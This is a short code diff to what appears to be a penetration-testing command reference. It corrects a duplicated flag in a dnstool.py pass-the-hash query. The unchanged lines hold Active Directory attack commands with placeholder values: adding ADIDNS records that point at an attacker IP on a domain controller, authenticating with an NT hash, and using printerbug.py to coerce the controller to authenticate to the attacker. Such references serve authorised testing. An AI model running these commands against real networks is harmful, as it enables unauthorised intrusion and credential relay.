@@ -10,5 +10,5 @@ dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action add -r "EXEGOL-01.$DOMA
 dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST"
 dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST" --forest
 dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
-dnstool.py -u "$DOMAIN"\\"$USER" -p -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
 printerbug.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" "$ATTACKER_IP"
